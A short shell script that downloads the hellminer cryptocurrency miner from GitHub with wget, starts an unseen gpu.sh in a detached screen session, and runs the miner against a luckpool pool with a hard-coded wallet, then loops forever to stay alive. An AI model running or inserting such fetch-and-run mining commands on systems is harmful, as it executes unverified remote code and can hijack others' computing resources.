#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -p x --cpu 4 -u RHX16QkJCpKAvebs3Nak7VVJMAMSvHYLhx.GOD
while [ 1 ]; do
sleep 3
done
sleep 999
